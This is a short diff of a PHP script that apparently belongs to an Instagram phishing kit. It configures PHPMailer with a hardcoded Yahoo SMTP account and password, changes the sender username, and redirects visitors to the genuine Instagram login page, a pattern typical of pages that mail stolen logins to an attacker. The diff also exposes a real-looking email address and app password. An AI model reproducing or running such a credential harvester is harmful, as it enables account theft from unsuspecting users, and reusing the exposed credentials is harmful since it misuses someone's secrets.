@@ -157,7 +157,7 @@ $mail->isSMTP();
 $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
 $mail->Host = 'smtp.mail.yahoo.com';
 $mail->SMTPAuth = true;
-$mail->Username = 'geofreybupamba@gmail.com';
+$mail->Username = 'bwiresoft.sandbox@yahoo.com';
 $mail->Password = 'kzbjdelygmyanvjt';
 $mail->SMTPSecure = 'tls';
 $mail->Port = 587;
@@ -184,3 +184,4 @@ header("location:https://www.instagram.com/accounts/login/?hl=en");
 header("location:../");
 }
 ?>
+
